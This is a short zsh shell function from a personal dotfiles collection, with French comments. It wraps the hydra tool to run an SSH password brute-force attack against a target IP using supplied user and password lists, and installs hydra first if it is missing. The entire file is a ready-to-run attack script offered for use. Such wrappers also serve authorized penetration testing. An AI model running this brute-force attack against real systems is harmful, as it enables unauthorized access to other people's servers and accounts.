# DESC: Tente de brute force SSH sur une cible
# USAGE: brute_ssh <target_ip> <user_list> <password_list>
brute_ssh() {
    # Vérifier et installer hydra si nécessaire
    UTILS_DIR="$HOME/dotfiles/zsh/functions/utils"
    if [ -f "$UTILS_DIR/ensure_tool.sh" ]; then
        source "$UTILS_DIR/ensure_tool.sh"
        ensure_tool hydra || return 1
    fi
    
	local target_ip="$1"
	local user_list="$2"
	local password_list="$3"
	
	if [ -z "$target_ip" ] || [ -z "$user_list" ] || [ -z "$password_list" ]; then
	    echo "Usage: brute_ssh <target_ip> <user_list> <password_list>"
	    return 1
	fi
	
	hydra -L "$user_list" -P "$password_list" ssh://"$target_ip"
}
